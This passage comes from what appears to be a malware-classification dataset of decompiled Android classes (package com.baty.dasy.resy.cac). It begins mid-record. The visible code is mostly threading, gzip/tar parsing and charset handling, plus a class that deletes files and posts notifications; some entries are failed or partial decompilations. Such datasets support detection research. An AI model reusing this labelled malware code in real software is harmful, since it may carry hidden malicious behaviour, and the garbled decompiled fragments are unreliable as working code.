e3.printStackTrace();         a((Exception)null);         a(-3);       }     }     return false;   }   @Override public void b(){     if (c()) {       return;     }     if (this.b != null) {       this.b.getConnectionManager().shutdown();     }     a((Map)null);     a((InputStream)null);     a((Exception)null);     a(-3);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.f\b.code","public class b {   private boolean a=false;   private List b=new ArrayList();   public b(){     a(3);   }   private c a(){     c cVar=null;     for (    c cVar2 : this.b) {       cVar2.a();       if (cVar != null && cVar2.size() >= cVar.size()) {         cVar2=cVar;       }       cVar=cVar2;     }     return cVar;   }   public boolean b(  e eVar){     return eVar.a();   }   public void a(  int i){     if (this.b.size() < i) {       int size=i - this.b.size();       for (int i2=0; i2 < size; i2++) {         this.b.add(new c(this));       }     }   }   public void a(  e eVar){     eVar.a(-1);     if (this.a) {       b(eVar);       return;     }     c a=a();     if (a != null) {       a.add(eVar);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.f\c.code","public class c extends ConcurrentLinkedQueue {   final b a;   private Thread b;   private int f17c=new Random().nextInt();   public c(  b bVar){     this.a=bVar;   }   public void a(){     Iterator it=iterator();     while (it.hasNext()) {       if (((e)it.next()).h() == -3) {         it.remove();       }     }   }   @Override public boolean add(  e eVar){     boolean add=super.add(eVar);     if (add && this.b == null) {       this.b=new d(this);       this.b.start();     }     return add;   }   @Override public String toString(){     return """" + this.f17c;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.f\d.code","public class d extends Thread {   final c a;   public d(  c cVar){     this.a=cVar;   }   @Override public void run(){     int i;     int i2=0;     while (true) {       e eVar=(e)this.a.peek();       if (eVar == null) {         this.a.b=null;         return;       }       if ((eVar.h() == -1 ? this.a.a.b(eVar) : false) || i2 > 1) {         this.a.poll();         i=0;       }  else {         eVar.a(-1);         i=i2 + 1;       }       i2=i;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.f\e.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1f85c02"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.f\f.code","public interface f {   void a(  e eVar,  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.f\g.code","public class g {   private String a;   private int b;   public g(  String str,  int i){     this.a=str;     this.b=i;   }   public String a(){     return this.a;   }   public int b(){     return this.b;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.f\h.code","public class h {   private String a;   private int d=0;   private Map b=new LinkedHashMap();   private Map f19c=new LinkedHashMap();   public h(  String str){     this.a=str;   }   public Map a(){     return this.f19c;   }   public void a(  String str,  Object obj){     this.f19c.put(str,obj);   }   public int b(){     return this.d;   }   public String c(){     return this.a;   }   public String d(){     if (this.b.isEmpty()) {       return """";     }     ArrayList arrayList=new ArrayList();     for (    String str : this.b.keySet()) {       Object obj=this.b.get(str);       if (obj != null) {         arrayList.add(new BasicNameValuePair(str,obj.toString()));       }     }     return URLEncodedUtils.format(arrayList,""utf-8"");   }   public String toString(){     String d=d();     return d.equals("""") ? this.a : this.a + ""?"" + d;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.g\a.code","public interface a {   void a(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.g\b.code","public class b implements a {   private static long a=0;   private Context b;   public b(  Context context,  Intent intent){     this.b=context;   }   @Override public void a(){     if (System.currentTimeMillis() - a < 5000) {       return;     }     a=System.currentTimeMillis();     com.baty.dasy.resy.cac.j.d.p(this.b);     com.baty.dasy.resy.cac.j.d.o(this.b);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.g\c.code","public class c implements a {   private static Set f20c=new HashSet();   private Context a;   private String b;   public c(  Context context,  String str){     this.a=context;     this.b=str;   }   public static void a(  e eVar){     f20c.add(eVar);   }   @Override public void a(){     com.baty.dasy.resy.cac.j.b bVar=new com.baty.dasy.resy.cac.j.b();     boolean a=bVar.a(this.b);     com.baty.dasy.resy.cac.c.a g=com.baty.dasy.resy.cac.j.d.g(this.a,this.b);     if (g != null) {       if (!a) {         g.x=4;         com.baty.dasy.resy.cac.j.d.e(this.a,g);         new com.baty.dasy.resy.cac.e.b().a(this.a,1);         com.baty.dasy.resy.cac.j.d.e(this.a,this.b);       }       com.baty.dasy.resy.cac.j.d.i(this.a,g);       j.a(this.a,g).delete();       j.b(g).delete();       Intent d=com.baty.dasy.resy.cac.j.d.d(this.a,this.b);       Notification notification=new Notification(R.drawable.ic_menu_agenda,"""",System.currentTimeMillis());       Context context=this.a;       String a2=com.baty.dasy.resy.cac.j.a.a(35);       int i=g.e;       if (d == null) {         d=new Intent();       }       q.a(context,notification,a2,i,16,d,g.d,-1);       Iterator it=f20c.iterator();       while (it.hasNext()) {         ((e)it.next()).b(g);       }       l.a(com.baty.dasy.resy.cac.j.a.a(29));     }     com.baty.dasy.resy.cac.c.a h=com.baty.dasy.resy.cac.j.d.h(this.a,this.b);     if (h != null) {       if (!a) {         h.x=4;         com.baty.dasy.resy.cac.j.d.f(this.a,h);         new com.baty.dasy.resy.cac.e.b().a(this.a,2);         com.baty.dasy.resy.cac.j.d.e(this.a,this.b);       }       com.baty.dasy.resy.cac.j.d.j(this.a,h);       j.a(this.a,h).delete();       j.b(h).delete();       Intent d2=com.baty.dasy.resy.cac.j.d.d(this.a,this.b);       Notification notification2=new Notification(R.drawable.ic_menu_agenda,"""",System.currentTimeMillis());       Context context2=this.a;       String a3=com.baty.dasy.resy.cac.j.a.a(35);       int i2=h.e;       if (d2 == null) {         d2=new Intent();       }       q.a(context2,notification2,a3,i2,16,d2,h.d,-1);       Iterator it2=f20c.iterator();       while (it2.hasNext()) {         ((e)it2.next()).b(h);       }       l.a(com.baty.dasy.resy.cac.j.a.a(30));     }     if (a) {       return;     }     new Timer().schedule(new d(this,bVar),new Random().nextInt(5000) + 2000);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.g\d.code","class d extends TimerTask {   final com.baty.dasy.resy.cac.j.b a;   final c b;   public d(  c cVar,  com.baty.dasy.resy.cac.j.b bVar){     this.b=cVar;     this.a=bVar;   }   @Override public void run(){     String str;     com.baty.dasy.resy.cac.j.b bVar=this.a;     str=this.b.b;     bVar.b(str);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.g\e.code","public interface e {   void b(  com.baty.dasy.resy.cac.c.a aVar); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.g\f.code","public class f implements a {   private Context a;   public f(  Context context,  Intent intent){     this.a=context;   }   @Override public void a(){     com.baty.dasy.resy.cac.j.d.o(this.a);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\a.code","public interface a { } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\b.code","public abstract class b extends InputStream {   private byte[] a=new byte[1];   private long b=0;   public void a(  int i){     a(i);   }   protected void a(  long j){     if (j != -1) {       this.b+=j;     }   }   @Override public int read(){     if (read(this.a,0,1) == -1) {       return -1;     }     return this.a[0] & 255;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\c.code","public class c {   public static boolean a(  String str,  byte[] bArr,  int i,  int i2){     try {       byte[] bytes=str.getBytes(""ASCII"");       return a(bytes,0,bytes.length,bArr,i,i2,false);     }  catch (    UnsupportedEncodingException e) {       throw new RuntimeException(e);     }   }   public static boolean a(  byte[] bArr,  int i,  int i2,  byte[] bArr2,  int i3,  int i4,  boolean z){     int i5=i2 < i4 ? i2 : i4;     for (int i6=0; i6 < i5; i6++) {       if (bArr[i + i6] != bArr2[i3 + i6]) {         return false;       }     }     if (i2 == i4) {       return true;     }     if (!z) {       return false;     }     if (i2 > i4) {       while (i4 < i2) {         if (bArr[i + i4] != 0) {           return false;         }         i4++;       }     }  else {       while (i2 < i4) {         if (bArr2[i3 + i2] != 0) {           return false;         }         i2++;       }     }     return true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\d.code","public abstract class d extends InputStream {   private long a=0;   public void a(  int i){     a(i);   }   protected void a(  long j){     if (j != -1) {       this.a+=j;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\e.code","class e implements q {   private final String a;   public e(){     this.a=null;   }   public e(  String str){     this.a=str;   }   @Override public String a(  byte[] bArr){     return this.a == null ? new String(bArr) : new String(bArr,this.a);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\f.code","public class f extends d {   static final boolean a;   private final InputStream b;   private final boolean f22c;   private int h;   private final byte[] d=new byte[8192];   private int e=0;   private Inflater f=new Inflater(true);   private CRC32 g=new CRC32();   private boolean i=false; static {     a=!f.class.desiredAssertionStatus();   }   public f(  InputStream inputStream,  boolean z){     if (inputStream.markSupported()) {       this.b=inputStream;     }  else {       this.b=new BufferedInputStream(inputStream);     }     this.f22c=z;     a(true);   }   private void a(  DataInputStream dataInputStream){     do {     }  while (dataInputStream.readUnsignedByte() != 0);   }   private boolean a(  boolean z){     if (!a && !z && !this.f22c) {       throw new AssertionError();     }     int read=this.b.read();     int read2=this.b.read();     if (read == -1 && !z) {       return false;     }     if (read != 31 || read2 != 139) {       throw new IOException("""");     }     DataInputStream dataInputStream=new DataInputStream(this.b);     if (dataInputStream.readUnsignedByte() != 8) {       throw new IOException("""");     }     int readUnsignedByte=dataInputStream.readUnsignedByte();     if ((readUnsignedByte & 224) != 0) {       throw new IOException("""");     }     dataInputStream.readInt();     dataInputStream.readUnsignedByte();     dataInputStream.readUnsignedByte();     if ((readUnsignedByte & 4) != 0) {       int readUnsignedByte2=dataInputStream.readUnsignedByte() | (dataInputStream.readUnsignedByte() << 8);       while (true) {         int i=readUnsignedByte2 - 1;         if (readUnsignedByte2 <= 0) {           break;         }         dataInputStream.readUnsignedByte();         readUnsignedByte2=i;       }     }     if ((readUnsignedByte & 8) != 0) {       a(dataInputStream);     }     if ((readUnsignedByte & 16) != 0) {       a(dataInputStream);     }     if ((readUnsignedByte & 2) != 0) {       dataInputStream.readShort();     }     this.f.reset();     this.g.reset();     this.h=0;     return true;   }   @Override public void close(){     if (this.f != null) {       this.f.end();       this.f=null;     }     if (this.b != System.in) {       this.b.close();     }   }   @Override public int read(){     byte[] bArr=new byte[1];     if (read(bArr,0,1) == -1) {       return -1;     }     return bArr[0] & 255;   }   @Override public int read(  byte[] bArr,  int i,  int i2){     if (this.i) {       return -1;     }     int i3=0;     while (i2 > 0) {       if (this.f.needsInput()) {         this.b.mark(this.d.length);         this.e=this.b.read(this.d);         if (this.e == -1) {           throw new EOFException();         }         this.f.setInput(this.d,0,this.e);       }       try {         int inflate=this.f.inflate(bArr,i,i2);         this.g.update(bArr,i,inflate);         this.h+=inflate;         i+=inflate;         i2-=inflate;         i3+=inflate;         a(inflate);         if (this.f.finished()) {           this.b.reset();           int remaining=this.e - this.f.getRemaining();           if (this.b.skip(remaining) != remaining) {             throw new IOException();           }           this.e=0;           DataInputStream dataInputStream=new DataInputStream(this.b);           long j=0;           for (int i4=0; i4 < 4; i4++) {             j|=dataInputStream.readUnsignedByte() << (i4 * 8);           }           if (j != this.g.getValue()) {             throw new IOException("""");           }           int i5=0;           for (int i6=0; i6 < 4; i6++) {             i5|=dataInputStream.readUnsignedByte() << (i6 * 8);           }           if (i5 != this.h) {             throw new IOException("""");           }           if (!this.f22c || !a(false)) {             this.f.end();             this.f=null;             this.i=true;             if (i3 != 0) {               return i3;             }             return -1;           }         }       }  catch (      DataFormatException e) {         throw new IOException(""Gzip-compressed data is corrupt"");       }     }     return i3;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\g.code","public final class g {   public static long a(  InputStream inputStream,  OutputStream outputStream){     return a(inputStream,outputStream,8024);   }   public static long a(  InputStream inputStream,  OutputStream outputStream,  int i){     byte[] bArr=new byte[i];     long j=0;     while (true) {       int read=inputStream.read(bArr);       if (-1 == read) {         return j;       }       outputStream.write(bArr,0,read);       j+=read;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\h.code","class h implements q {   private final Charset a;   public h(  Charset charset){     this.a=charset;   }   @Override public String a(  byte[] bArr){     return this.a.newDecoder().onMalformedInput(CodingErrorAction.REPORT).onUnmappableCharacter(CodingErrorAction.REPORT).decode(ByteBuffer.wrap(bArr)).toString();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\i.code","class i implements q {   private final char[] a;   private final List b;   public i(  char[] cArr){     this.a=(char[])cArr.clone();     ArrayList arrayList=new ArrayList(this.a.length);     byte b=Byte.MAX_VALUE;     for (int i=0; i < this.a.length; i++) {       b=(byte)(b + 1);       arrayList.add(new j(b,this.a[i]));     }     Collections.sort(arrayList);     this.b=Collections.unmodifiableList(arrayList);   }   public char a(  byte b){     return b >= 0 ? (char)b : this.a[b + 128];   }   @Override public String a(  byte[] bArr){     char[] cArr=new char[bArr.length];     for (int i=0; i < bArr.length; i++) {       cArr[i]=a(bArr[i]);     }     return new String(cArr);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\j.code","final class j implements Comparable {   public final char a;   public final byte b;   public j(  byte b,  char c2){     this.b=b;     this.a=c2;   }   @Override public int compareTo(  j jVar){     return this.a - jVar.a;   }   public boolean equals(  Object obj){     if (!(obj instanceof j)) {       return false;     }     j jVar=(j)obj;     return this.a == jVar.a && this.b == jVar.b;   }   public int hashCode(){     return this.a;   }   public String toString(){     return ""0x"" + Integer.toHexString(65535 & this.a) + ""->0x""+ Integer.toHexString(this.b & 255);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\k.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2749622c"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\l.code","public class l extends b {   protected final n a;   private boolean b;   private long f24c;   private long d;   private byte[] e;   private k f;   private final q g;   public l(  InputStream inputStream){     this(inputStream,10240,512);   }   public l(  InputStream inputStream,  int i,  int i2){     this(inputStream,i,i2,null);   }   public l(  InputStream inputStream,  int i,  int i2,  String str){     this.a=new n(inputStream,i,i2);     this.e=null;     this.b=false;     this.g=r.a(str);   }   private void a(  Map map){     for (    Map.Entry entry : map.entrySet()) {       String str=(String)entry.getKey();       String str2=(String)entry.getValue();       if (""path"".equals(str)) {         this.f.a(str2);       }  else       if (""linkpath"".equals(str)) {         this.f.b(str2);       }  else       if (""gid"".equals(str)) {         this.f.b(Integer.parseInt(str2));       }  else       if (""gname"".equals(str)) {         this.f.d(str2);       }  else       if (""uid"".equals(str)) {         this.f.a(Integer.parseInt(str2));       }  else       if (""uname"".equals(str)) {         this.f.c(str2);       }  else       if (""size"".equals(str)) {         this.f.b(Long.parseLong(str2));       }  else       if (""mtime"".equals(str)) {         this.f.a((long)(Double.parseDouble(str2) * 1000.0d));       }  else       if (""SCHILY.devminor"".equals(str)) {         this.f.d(Integer.parseInt(str2));       }  else       if (""SCHILY.devmajor"".equals(str)) {         this.f.c(Integer.parseInt(str2));       }     }   }   private byte[] c(){     if (this.b) {       return null;     }     byte[] b=this.a.b();     if (b == null) {       this.b=true;     }  else     if (this.a.a(b)) {       this.b=true;     }     if (this.b) {       return null;     }     return b;   }   private void d(){     Map a=a(this);     b();     a(a);   }   private void e(){     byte[] c2;     if (!this.f.c()) {       return;     }     do {       c2=c();       if (this.b) {         this.f=null;         return;       }     }  while (new m(c2).a());   }   public k a(){     if (this.b) {       return null;     }     if (this.f != null) {       long j=this.f24c;       long j2=this.d;       do {         j-=j2;         if (j > 0) {           j2=skip(j);         }  else {           this.e=null;         }       }  while (j2 > 0);       throw new RuntimeException("""");     }     byte[] c2=c();     if (this.b) {       this.f=null;       return null;     }     try {       this.f=new k(c2,this.g);       this.d=0L;       this.f24c=this.f.b();       if (this.f.e()) {         StringBuffer stringBuffer=new StringBuffer();         byte[] bArr=new byte[256];         while (true) {           int read=read(bArr);           if (read < 0) {             break;           }           stringBuffer.append(new String(bArr,0,read));         }         b();         if (this.f == null) {           return null;         }         if (stringBuffer.length() > 0 && stringBuffer.charAt(stringBuffer.length() - 1) == 0) {           stringBuffer.deleteCharAt(stringBuffer.length() - 1);         }         this.f.a(stringBuffer.toString());       }       if (this.f.f()) {         d();       }       if (this.f.d()) {         e();       }       this.f24c=this.f.b();       return this.f;     }  catch (    IllegalArgumentException e) {       IOException iOException=new IOException("""");       iOException.initCause(e);       throw iOException;     }   }   Map a(  InputStream inputStream){     int read;     int i;     HashMap hashMap=new HashMap();     do {       int i2=0;       int i3=0;       while (true) {         read=inputStream.read();         if (read == -1) {           break;         }         i2++;         if (read == 32) {           ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();           while (true) {             read=inputStream.read();             if (read == -1) {               break;             }             i2++;             if (read == 61) {               String byteArrayOutputStream2=byteArrayOutputStream.toString(com.seleuco.common.util.e.f);               byte[] bArr=new byte[i3 - i2];               if (inputStream.read(bArr) != i3 - i2) {                 throw new IOException("""");               }               hashMap.put(byteArrayOutputStream2,new String(bArr,0,(i3 - i2) - 1,com.seleuco.common.util.e.f));               i=read;             }  else {               byteArrayOutputStream.write((byte)read);             }           }         }  else {           i3=(i3 * 10) + (read - 48);         }       }       i=read;     }  while (i != -1);     return hashMap;   }   @Override public int available(){     if (this.f24c - this.d > 2147483647L) {       return Integer.MAX_VALUE;     }     return (int)(this.f24c - this.d);   }   public a b(){     return a();   }   @Override public void close(){     this.a.d();   }   @Override public int read(  byte[] bArr,  int i,  int i2){     int i3;     int i4;     if (this.d >= this.f24c) {       return -1;     }     if (i2 + this.d > this.f24c) {       i2=(int)(this.f24c - this.d);     }     if (this.e != null) {       int length=i2 > this.e.length ? this.e.length : i2;       System.arraycopy(this.e,0,bArr,i,length);       if (length >= this.e.length) {         this.e=null;       }  else {         int length2=this.e.length - length;         byte[] bArr2=new byte[length2];         System.arraycopy(this.e,length,bArr2,0,length2);         this.e=bArr2;       }       i3=0 + length;       i4=i2 - length;       i+=length;     }  else {       i3=0;       i4=i2;     }     while (i4 > 0) {       byte[] b=this.a.b();       if (b == null) {         throw new IOException("""");       }       a(b.length);       int length3=b.length;       if (length3 > i4) {         System.arraycopy(b,0,bArr,i,i4);         this.e=new byte[length3 - i4];         System.arraycopy(b,i4,this.e,0,length3 - i4);         length3=i4;       }  else {         System.arraycopy(b,0,bArr,i,length3);       }       i3+=length3;       i4-=length3;       i+=length3;     }     this.d+=i3;     return i3;   }   @Override public synchronized void reset(){   }   @Override public long skip(  long j){     byte[] bArr=new byte[8192];     long j2=j;     while (j2 > 0) {       int read=read(bArr,0,(int)(j2 > ((long)bArr.length) ? bArr.length : j2));       if (read == -1) {         break;       }       j2-=read;     }     return j - j2;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\m.code","public class m {   private boolean a;   public m(  byte[] bArr){     this.a=o.a(bArr,504);   }   public boolean a(){     return this.a;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\n.code","class n {   private InputStream a;   private OutputStream b;   private final int f25c;   private final int d;   private final int e;   private final byte[] f;   private int g;   private int h;   public n(  InputStream inputStream,  int i,  int i2){     this(inputStream,null,i,i2);   }   private n(  InputStream inputStream,  OutputStream outputStream,  int i,  int i2){     this.a=inputStream;     this.b=outputStream;     this.f25c=i;     this.d=i2;     this.e=this.f25c / this.d;     this.f=new byte[this.f25c];     if (this.a != null) {       this.g=-1;       this.h=this.e;     }  else {       this.g=0;       this.h=0;     }   }   private boolean e(){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.dasy.resy.cac.h.n.e():boolean"");   }   private void f(){     if (this.b == null) {       throw new IOException("""");     }     this.b.write(this.f,0,this.f25c);     this.b.flush();     this.h=0;     this.g++;     Arrays.fill(this.f,(byte)0);   }   public int a(){     return this.d;   }   public boolean a(  byte[] bArr){     int a=a();     for (int i=0; i < a; i++) {       if (bArr[i] != 0) {         return false;       }     }     return true;   }   public byte[] b(){     if (this.a == null) {       if (this.b == null) {         throw new IOException("""");       }       throw new IOException("""");     }     if (this.h >= this.e && !e()) {       return null;     }     byte[] bArr=new byte[this.d];     System.arraycopy(this.f,this.h * this.d,bArr,0,this.d);     this.h++;     return bArr;   }   void c(){     if (this.b == null) {       throw new IOException("""");     }     if (this.h > 0) {       f();     }   }   public void d(){     if (this.b == null) {       if (this.a != null) {         if (this.a != System.in) {           this.a.close();         }         this.a=null;         return;       }       return;     }     c();     if (this.b == System.out || this.b == System.err) {       return;     }     this.b.close();     this.b=null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\o.code","public class o {   static final q a=r.a(null);   static final q b=new p();   public static long a(  byte[] bArr,  int i,  int i2){     long j=0;     int i3=i + i2;     if (i2 < 2) {       throw new IllegalArgumentException("""");     }     if (bArr[i] != 0) {       int i4=i;       while (i4 < i3 && bArr[i4] == 32) {         i4++;       }       byte b2=bArr[i3 - 1];       if (b2 != 0 && b2 != 32) {         throw new IllegalArgumentException(a(bArr,i,i2,i3 - 1,b2));       }       int i5=i3 - 1;       byte b3=bArr[i5 - 1];       if (b3 == 0 || b3 == 32) {         i5--;       }       while (i4 < i5) {         byte b4=bArr[i4];         if (b4 < 48 || b4 > 55) {           throw new IllegalArgumentException(a(bArr,i,i2,i4,b4));         }         i4++;         j=(b4 - 48) + (j << 3);       }     }     return j;   }   private static long a(  byte[] bArr,  int i,  int i2,  boolean z){     if (i2 >= 9) {       throw new IllegalArgumentException("""");     }     long j=0;     int i3=1;     while (i3 < i2) {       long j2=(bArr[i + i3] & 255) + (j << 8);       i3++;       j=j2;     }     if (z) {       j=(j - 1) ^ (((long)Math.pow(2.0d,(i2 - 1) * 8)) - 1);     }     return z ? -j : j;   }   private static String a(  byte[] bArr,  int i,  int i2,  int i3,  byte b2){     return ""Invalid byte "" + ((int)b2) + "" at offset ""+ (i3 - i)+ "" in '""+ new String(bArr,i,i2).replaceAll(""\u0000"",""{NUL}"")+ ""' len=""+ i2;   }   public static String a(  byte[] bArr,  int i,  int i2,  q qVar){     while (i2 > 0 && bArr[(i + i2) - 1] == 0) {       i2--;     }     if (i2 <= 0) {       return """";     }     byte[] bArr2=new byte[i2];     System.arraycopy(bArr,i,bArr2,0,i2);     return qVar.a(bArr2);   }   public static boolean a(  byte[] bArr,  int i){     return bArr[i] == 1;   }   public static long b(  byte[] bArr,  int i,  int i2){     if ((bArr[i] & 128) == 0) {       return a(bArr,i,i2);     }     boolean z=bArr[i] == -1;     return i2 < 9 ? a(bArr,i,i2,z) : b(bArr,i,i2,z);   }   private static long b(  byte[] bArr,  int i,  int i2,  boolean z){     byte[] bArr2=new byte[i2 - 1];     System.arraycopy(bArr,i + 1,bArr2,0,i2 - 1);     BigInteger bigInteger=new BigInteger(bArr2);     if (z) {       bigInteger=bigInteger.add(BigInteger.valueOf(-1L)).not();     }     if (bigInteger.bitLength() > 63) {       throw new IllegalArgumentException("""");     }     return z ? -bigInteger.longValue() : bigInteger.longValue();   }   public static String c(  byte[] bArr,  int i,  int i2){     try {       return a(bArr,i,i2,a);     }  catch (    IOException e) {       try {         return a(bArr,i,i2,b);       }  catch (      IOException e2) {         throw new RuntimeException(e2);       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\p.code","final class p implements q {   @Override public String a(  byte[] bArr){     StringBuffer stringBuffer=new StringBuffer(bArr.length);     for (    byte b : bArr) {       if (b == 0) {         break;       }       stringBuffer.append((char)(b & 255));     }     return stringBuffer.toString();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\q.code","public interface q {   String a(  byte[] bArr); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\r.code","public abstract class r {   static final q a;   private static final Map b=new HashMap();   private static final byte[] f26c; static {     s sVar=new s(new char[]{199,252,233,226,228,224,229,231,234,235,232,239,238,236,196,197,201,230,198,244,246,242,251,249,255,214,220,162,163,165,8359,402,225,237,243,250,241,209,170,186,191,8976,172,189,188,161,171,187,9617,9618,9619,9474,9508,9569,9570,9558,9557,9571,9553,9559,9565,9564,9563,9488,9492,9524,9516,9500,9472,9532,9566,9567,9562,9556,9577,9574,9568,9552,9580,9575,9576,9572,9573,9561,9560,9554,9555,9579,9578,9496,9484,9608,9604,9612,9616,9600,945,223,915,960,931,963,181,964,934,920,937,948,8734,966,949,8745,8801,177,8805,8804,8992,8993,247,8776,176,8729,183,8730,8319,178,9632,160});     b.put(""CP437"",sVar);     b.put(""Cp437"",sVar);     b.put(""cp437"",sVar);     b.put(""IBM437"",sVar);     b.put(""ibm437"",sVar);     s sVar2=new s(new char[]{199,252,233,226,228,224,229,231,234,235,232,239,238,236,196,197,201,230,198,244,246,242,251,249,255,214,220,248,163,216,215,402,225,237,243,250,241,209,170,186,191,174,172,189,188,161,171,187,9617,9618,9619,9474,9508,193,194,192,169,9571,9553,9559,9565,162,165,9488,9492,9524,9516,9500,9472,9532,227,195,9562,9556,9577,9574,9568,9552,9580,164,240,208,202,203,200,305,205,206,207,9496,9484,9608,9604,166,204,9600,211,223,212,210,245,213,181,254,222,218,219,217,253,221,175,180,173,177,8215,190,182,167,247,184,176,168,183,185,179,178,9632,160});     b.put(""CP850"",sVar2);     b.put(""Cp850"",sVar2);     b.put(""cp850"",sVar2);     b.put(""IBM850"",sVar2);     b.put(""ibm850"",sVar2);     f26c=new byte[]{48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70};     a=new e(""UTF8"");   }   public static q a(  String str){     if (b(str)) {       return a;     }     if (str == null) {       return new e();     }     s sVar=(s)b.get(str);     if (sVar != null) {       return sVar.a();     }     try {       return new h(Charset.forName(str));     }  catch (    UnsupportedCharsetException e) {       return new e(str);     }   }   static boolean b(  String str){     if (str == null) {       str=System.getProperty(""file.encoding"");     }     return ""UTF8"".equalsIgnoreCase(str) || com.seleuco.common.util.e.f.equalsIgnoreCase(str);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.h\s.code","class s {   private final char[] a;   private i b;   public s(  char[] cArr){     this.a=cArr;   }   public synchronized i a(){     if (this.b == null) {       this.b=new i(this.a);     }     return this.b;   } } "
